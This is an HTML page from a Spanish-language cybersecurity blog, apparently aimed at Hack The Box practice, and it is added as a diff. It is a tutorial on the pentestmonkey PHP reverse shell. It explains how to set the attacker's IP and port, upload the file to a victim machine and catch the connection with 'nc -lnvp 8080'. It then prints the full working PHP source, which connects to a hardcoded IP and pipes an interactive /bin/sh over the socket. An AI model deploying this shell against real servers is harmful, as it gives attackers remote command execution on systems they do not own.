@@ -1,0 +1,459 @@
+<!-------------------------------------------------------------------------------->
+<!-------------------------------------------------------------------------------->
+
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=4e466187f8c7aec736a8844fc4931d346df15ea7">     <!-- Archivo CSS O SCSS Jekyll -->
+    <!-- <link rel="stylesheet" href="/assets/css/icon-style.css"> -->                                  <!-- Archivo CSS O SCSS del Buscador -->
+    <script src="https://kit.fontawesome.com/41bcea2ae3.js" crossorigin="anonymous"></script>           <!-- Archivo Java para importar fuentes -->
+
+  <!---------------------- Configuración de Colores ------------------------------->
+
+    <meta name="theme-color" content="#151515">
+    <meta name="msapplication-navbutton-color" content="#151515">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  <!--------------------- Begin Jekyll SEO tag v2.8.0 ----------------------------->
+
+   <title>F1r0x | Blog sobre Ciberseguridad.</title>
+   <link rel="icon" href="/assets/images/logoweb.ico">
+   <meta name="generator" content="Jekyll v3.9.2" />
+   <meta property="og:title" content="F1r0x" />
+   <meta property="og:locale" content="en_US" />
+   <meta name="description" content="Blog sobre Ciberseguridad." />
+   <meta property="og:description" content="Blog sobre Ciberseguridad." />
+   <link rel="canonical" href="https://f1r0x.github.io/Web/php-reverse-shell.html" />         <!-- ¡¡¡ Cambiar !!!  -->
+   <meta property="og:url" content="https://f1r0x.github.io/Web/php-reverse-shell.html" />    <!-- ¡¡¡ Cambiar !!!  -->
+   <meta property="og:site_name" content="F1r0x" />
+   <meta property="og:type" content="website" />
+   <meta name="twitter:card" content="summary" />
+   <meta property="twitter:title" content="F1r0x" />
+   <script type="application/ld+json">
+   {"@context":"https://schema.org","@type":"WebPage","description":"Blog sobre Ciberseguridad.","headline":"F1r0x","url":"https://f1r0x.github.io/portada.html"}</script>
+
+</head>
+
+<!--------------------------- Encabezado de la página ---------------------------------->
+
+<header>
+  <div class="container">
+    <a id="a-title" href="/">
+      <h5>F1r0x</h5>                                                                                                    <!-- Nombre del Autor -->                         
+    </a>
+    <h6>Shell</h6>                                                                                 <!-- Descripción de la Página-->
+
+<!--------------------------------- Botón Github ---------------------------------------->    
+    <section id="downloads">         
+      <a href="https://github.com/F1r0x/f1r0x.github.io" class="btn btn-github"><span class="icon"></span>GitHub</a>    <!-- Contenido del botón Github -->
+    </section>
+  </div>
+</header>
+
+<!---------------------------------  Buscador  ------------------------------------------>
+
+<!--
+<body>
+<div id="a-buscador" class="buscar">
+  <input type="text" class="buscar_texto" placeholder="Escrive lo que buscas">
+  <a href="" class="boton">
+  <i class="icon-buscar"></i>
+  </a>
+</div>
+</body>
+-->
+
+<!----------------------------------------------------------------------------------------->
+<!----------------------------------------------------------------------------------------->
+<!---------------------- Contenido del Cuerpo de la Página -------------------------------->  
+<!------------------------------ Botones y Efectos  --------------------------------------->
+<!----------------------------------------------------------------------------------------->
+
+<div class="container">
+  
+<!----------------------------- Imagen Hack The Box -------------------------------------->   
+
+<!--
+  <section id="main_content">
+    <p><a href="./hackthebox.html" style="text-decoration:none">
+          <img src="https://user-images.githubusercontent.com/103068924/186534363-a36084e5-2626-4b25-976c-ab2d232462f5.gif" align="middle" />
+       </a>
+    </p>
+  </section>
+-->
+
+<!--------------------------------  Letrero Animado  --------------------------------------->      
+ 
+  <svg viewBox="0 0 1320 300">
+
+    <!-- Símbolo -->
+    <symbol id="s-text">
+      <text text-anchor="middle"
+            x="50%" y="50%" dy=".35em">
+        PHP SHELL  <!-- Palabra del Letrero-->
+      </text>
+    </symbol>  
+  
+    <!-- Añadir en función de las letras de la palabra -->
+    <use xlink:href="#s-text" class="text"></use><!--1-->
+    <use xlink:href="#s-text" class="text"></use><!--2-->  
+    <use xlink:href="#s-text" class="text"></use><!--3-->
+    <use xlink:href="#s-text" class="text"></use><!--4-->
+    <use xlink:href="#s-text" class="text"></use><!--5-->
+    <use xlink:href="#s-text" class="text"></use><!--6-->
+    <use xlink:href="#s-text" class="text"></use><!--7-->
+    <use xlink:href="#s-text" class="text"></use><!--8-->
+    <use xlink:href="#s-text" class="text"></use><!--9-->
+  </svg>
+
+<!----------------------------------------------------------------------------------------->
+<!----------------------------------------------------------------------------------------->
+<!---------------------------- Contenido de la Página ------------------------------------->  
+<!----------------------------------------------------------------------------------------->
+<!----------------------------------------------------------------------------------------->
+
+<h1 id="php-reverse-shellphp">php-reverse-shell.php</h1>
+
+<p>Este script realizará una conexión TCP saliente a una
+IP y un puerto codificados.</p>
+
+<p>El destinatario recibirá un shell ejecutándose como el
+usuario actual (normalmente apache).</p>
+
+<h1 id="repositorio">Repositorio:</h1>
+
+<p>Podéis enconmtrar y copiar el script al final de ester artículo o descargarlo desde el siguiente elace.</p>
+<ul>
+  <li><a href="/Web/Herramientas_y_Scripts/php-reverse-shell.php">php-reverse-shell.php</a></li>
+</ul>
+
+<h1 id="configuración">Configuración:</h1>
+
+<p>La configuración es muy simple, lo único que tenemos que hacer es cambiar la Ip 
+por la de nuestro sistema y establecer el puerto por el que queremos ponernos
+en escucha.</p>
+
+<p>Abrimos una terminar y modificamos el archivo <code class="language-plaintext highlighter-rouge">php-reverse-shell.php</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nano php-reverse-shell.php
+</code></pre></div></div>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/163163832-7a4632e4-a547-4ac4-b3a2-24cb5c7075e7.png" alt="Captura de pantalla -2022-04-13 12-42-02" /></p>
+
+<p>Establecemos nuestra Ip (tun0) y el puerto de escucha (en este ejemplo usaremos el 8080). Para saber cuál es nuestra Ip, podemos verlo mediante el
+comando ‘ipconfig’:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo ifconfig
+</code></pre></div></div>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/163163897-cf030c6f-617c-458e-b1ab-6f89c3ba5a25.png" alt="Captura de pantalla -2022-04-13 12-42-15" /></p>
+
+<p>Guardamos (Cntrl + o) y salimos (Cntrl + x).</p>
+
+<h1 id="ejecución">Ejecución:</h1>
+
+<p>Primero cargamos el archivo php-reverse-shell.php a una máquina víctima. Luego, mediante la herramienta NetCat 
+nos pondremos por escucha por el puerto previamente definido (en nuestro caso el 8080):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lnvp 8080
+</code></pre></div></div>
+
+<p>Ejecutamos el archivo php-reverse-shell.php (recargamos el navegado en la dirección en la que se encuentre el 
+archivo). Si todo ha funcionado correctamente se nos tendría que abrir una shell en la terminal en la que estábamos 
+en escucha.</p>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/163164862-0dba798c-7350-45be-a5d0-343ce80bed36.png" alt="Captura de pantalla -2022-04-13 12-50-19" /></p>
+
+<p>En caso de no funcionaros un puerto, seguir probando, ya que en muchas ocasiones esos puertos están cerrados y no
+se puede acceder a través de ellos.</p>
+
+<p>Otra causa de fallo habitual es que el sistema tenga algún firewall que no permita pasar a la reverse shell.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="c1">// php-reverse-shell - A Reverse Shell implementation in PHP</span>
+<span class="c1">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span>
+<span class="c1">//</span>
+<span class="c1">// This tool may be used for legal purposes only.  Users take full responsibility</span>
+<span class="c1">// for any actions performed using this tool.  The author accepts no liability</span>
+<span class="c1">// for damage caused by this tool.  If these terms are not acceptable to you, then</span>
+<span class="c1">// do not use this tool.</span>
+<span class="c1">//</span>
+<span class="c1">// In all other respects the GPL version 2 applies:</span>
+<span class="c1">//</span>
+<span class="c1">// This program is free software; you can redistribute it and/or modify</span>
+<span class="c1">// it under the terms of the GNU General Public License version 2 as</span>
+<span class="c1">// published by the Free Software Foundation.</span>
+<span class="c1">//</span>
+<span class="c1">// This program is distributed in the hope that it will be useful,</span>
+<span class="c1">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
+<span class="c1">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
+<span class="c1">// GNU General Public License for more details.</span>
+<span class="c1">//</span>
+<span class="c1">// You should have received a copy of the GNU General Public License along</span>
+<span class="c1">// with this program; if not, write to the Free Software Foundation, Inc.,</span>
+<span class="c1">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span>
+<span class="c1">//</span>
+<span class="c1">// This tool may be used for legal purposes only.  Users take full responsibility</span>
+<span class="c1">// for any actions performed using this tool.  If these terms are not acceptable to</span>
+<span class="c1">// you, then do not use this tool.</span>
+<span class="c1">//</span>
+<span class="c1">// You are encouraged to send comments, improvements or suggestions to</span>
+<span class="c1">// me at pentestmonkey@pentestmonkey.net</span>
+<span class="c1">//</span>
+<span class="c1">// Description</span>
+<span class="c1">// -----------</span>
+<span class="c1">// This script will make an outbound TCP connection to a hardcoded IP and port.</span>
+<span class="c1">// The recipient will be given a shell running as the current user (apache normally).</span>
+<span class="c1">//</span>
+<span class="c1">// Limitations</span>
+<span class="c1">// -----------</span>
+<span class="c1">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span>
+<span class="c1">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</span>
+<span class="c1">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</span>
+<span class="c1">//</span>
+<span class="c1">// Usage</span>
+<span class="c1">// -----</span>
+<span class="c1">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span>
+
+<span class="nb">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">"1.0"</span><span class="p">;</span>
+<span class="nv">$ip</span> <span class="o">=</span> <span class="s1">'10.10.15.1'</span><span class="p">;</span>  <span class="c1">// CHANGE THIS</span>
+<span class="nv">$port</span> <span class="o">=</span> <span class="mi">8080</span><span class="p">;</span>       <span class="c1">// CHANGE THIS</span>
+<span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">;</span>
+<span class="nv">$write_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+<span class="nv">$error_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+<span class="nv">$shell</span> <span class="o">=</span> <span class="s1">'uname -a; w; id; /bin/sh -i'</span><span class="p">;</span>
+<span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="nv">$debug</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="c1">//</span>
+<span class="c1">// Daemonise ourself if possible to avoid zombies later</span>
+<span class="c1">//</span>
+
+<span class="c1">// pcntl_fork is hardly ever available, but will allow us to daemonise</span>
+<span class="c1">// our php process and avoid zombies.  Worth a try...</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'pcntl_fork'</span><span class="p">))</span> <span class="p">{</span>
+	<span class="c1">// Fork and have the parent process exit</span>
+	<span class="nv">$pid</span> <span class="o">=</span> <span class="nb">pcntl_fork</span><span class="p">();</span>
+	
+	<span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nf">printit</span><span class="p">(</span><span class="s2">"ERROR: Can't fork"</span><span class="p">);</span>
+		<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+	
+	<span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>  <span class="c1">// Parent exits</span>
+	<span class="p">}</span>
+
+	<span class="c1">// Make the current process a session leader</span>
+	<span class="c1">// Will only succeed if we forked</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nb">posix_setsid</span><span class="p">()</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nf">printit</span><span class="p">(</span><span class="s2">"Error: Can't setsid()"</span><span class="p">);</span>
+		<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+
+	<span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+	<span class="nf">printit</span><span class="p">(</span><span class="s2">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// Change to a safe directory</span>
+<span class="nb">chdir</span><span class="p">(</span><span class="s2">"/"</span><span class="p">);</span>
+
+<span class="c1">// Remove any umask we inherited</span>
+<span class="nb">umask</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+<span class="c1">//</span>
+<span class="c1">// Do the reverse shell...</span>
+<span class="c1">//</span>
+
+<span class="c1">// Open reverse connection</span>
+<span class="nv">$sock</span> <span class="o">=</span> <span class="nb">fsockopen</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nf">printit</span><span class="p">(</span><span class="s2">"</span><span class="nv">$errstr</span><span class="s2"> (</span><span class="nv">$errno</span><span class="s2">)"</span><span class="p">);</span>
+	<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// Spawn shell process</span>
+<span class="nv">$descriptorspec</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+   <span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">),</span>  <span class="c1">// stdin is a pipe that the child will read from</span>
+   <span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">),</span>  <span class="c1">// stdout is a pipe that the child will write to</span>
+   <span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">)</span>   <span class="c1">// stderr is a pipe that the child will write to</span>
+<span class="p">);</span>
+
+<span class="nv">$process</span> <span class="o">=</span> <span class="nb">proc_open</span><span class="p">(</span><span class="nv">$shell</span><span class="p">,</span> <span class="nv">$descriptorspec</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span>
+	<span class="nf">printit</span><span class="p">(</span><span class="s2">"ERROR: Can't spawn shell"</span><span class="p">);</span>
+	<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// Set everything to non-blocking</span>
+<span class="c1">// Reason: Occsionally reads will block, even though stream_select tells us they won't</span>
+<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
+<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
+<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
+<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+<span class="nf">printit</span><span class="p">(</span><span class="s2">"Successfully opened reverse shell to </span><span class="nv">$ip</span><span class="s2">:</span><span class="nv">$port</span><span class="s2">"</span><span class="p">);</span>
+
+<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+	<span class="c1">// Check for end of TCP connection</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$sock</span><span class="p">))</span> <span class="p">{</span>
+		<span class="nf">printit</span><span class="p">(</span><span class="s2">"ERROR: Shell connection terminated"</span><span class="p">);</span>
+		<span class="k">break</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="c1">// Check for end of STDOUT</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+		<span class="nf">printit</span><span class="p">(</span><span class="s2">"ERROR: Shell process terminated"</span><span class="p">);</span>
+		<span class="k">break</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="c1">// Wait until a command is end down $sock, or some</span>
+	<span class="c1">// command output is available on STDOUT or STDERR</span>
+	<span class="nv">$read_a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+	<span class="nv">$num_changed_sockets</span> <span class="o">=</span> <span class="nb">stream_select</span><span class="p">(</span><span class="nv">$read_a</span><span class="p">,</span> <span class="nv">$write_a</span><span class="p">,</span> <span class="nv">$error_a</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>
+
+	<span class="c1">// If we can read from the TCP socket, send</span>
+	<span class="c1">// data to process's STDIN</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nf">printit</span><span class="p">(</span><span class="s2">"SOCK READ"</span><span class="p">);</span>
+		<span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$chunk_size</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nf">printit</span><span class="p">(</span><span class="s2">"SOCK: </span><span class="nv">$input</span><span class="s2">"</span><span class="p">);</span>
+		<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$input</span><span class="p">);</span>
+	<span class="p">}</span>
+
+	<span class="c1">// If we can read from the process's STDOUT</span>
+	<span class="c1">// send data down tcp connection</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nf">printit</span><span class="p">(</span><span class="s2">"STDOUT READ"</span><span class="p">);</span>
+		<span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nf">printit</span><span class="p">(</span><span class="s2">"STDOUT: </span><span class="nv">$input</span><span class="s2">"</span><span class="p">);</span>
+		<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
+	<span class="p">}</span>
+
+	<span class="c1">// If we can read from the process's STDERR</span>
+	<span class="c1">// send data down tcp connection</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nf">printit</span><span class="p">(</span><span class="s2">"STDERR READ"</span><span class="p">);</span>
+		<span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nf">printit</span><span class="p">(</span><span class="s2">"STDERR: </span><span class="nv">$input</span><span class="s2">"</span><span class="p">);</span>
+		<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$sock</span><span class="p">);</span>
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+<span class="nb">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>
+
+<span class="c1">// Like print, but does nothing if we've daemonised ourself</span>
+<span class="c1">// (I can't figure out how to redirect STDOUT like a proper daemon)</span>
+<span class="k">function</span> <span class="n">printit</span> <span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$daemon</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">print</span> <span class="s2">"</span><span class="nv">$string</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span> 
+</code></pre></div></div>
+
+
+<!----------------------------------------------------------------------------------------->
+<!----------------------------------------------------------------------------------------->
+<!---------------------------- Fin del contenido de la Página ----------------------------->  
+<!----------------------------------------------------------------------------------------->
+<!----------------------------------------------------------------------------------------->
+
+
+<!----------------------------------  Menu lateral  --------------------------------------->
+
+<body id="body">
+    
+<div class="icon__menu">
+<i class="fas fa-bars" id="btn_open"></i>
+</div>
+
+<div class="menu__side" id="menu_side">
+
+<!--- Botón Youtube --- 
+<div class="name__page">
+<i class="fab fa-youtube"></i>
+<h4>F1r0x</h4>
+</div>
+-->
+
+<div class="options__menu">	
+
+<a href="../portada.html" class="selected">
+<div class="option">
+<i class="fas fa-home" title="Inicio"></i>
+<h4>Inicio</h4>
+</div>
+</a>
+
+<a href="./articulos.html">
+<div class="option">
+<i class="far fa-file" title="Artículos"></i>
+<h4>Artículos</h4>
+</div>
+</a>
+            
+<a href="./cursos.html">
+<div class="option">
+<i class="fas fa-video" title="Cursos"></i>
+<h4>Cursos</h4>
+</div>
+</a>
+
+<a href="./hackthebox.html">
+<div class="option">
+<i class="far fa-sticky-note" title="Hack the Box"></i>
+<h4>HTB</h4>
+</div>
+</a>
+
+<a href="./contacto.html">
+<div class="option">
+<i class="far fa-id-badge" title="Contacto"></i>
+<h4>Contacto</h4>
+</div>
+</a>
+
+<a href="./referencias.html">
+<div class="option">
+<i class="far fa-address-card" title="Referencias"></i>
+<h4>Referencias</h4>
+</div>
+</a>
+
+</div>
+
+</div>
+
+<script src="../js/script.js"></script>  <!-- Archivo Java para el menú lateral responsive -->
+</body>
+
+<!-------------------------------------  Gestor de Comentrarios  ---------------------------------->
+
+<html lang="en">
+  <div id="comentarios">
+    <body>
+      <script src="https://utteranc.es/client.js" repo="F1r0x/gestion-comentarios" issue-term="pathname" theme="github-light" crossorigin="anonymous" async="">
+      </script>         
+    </body>
+  </div>
+</html>
+
+<!-------------------------------------------------------------------------------------------------->
+
+    </div>
+</html>
+
+<!------------------------------------------------------------------------------------------------->
+<!------------------------------------------------------------------------------------------------->
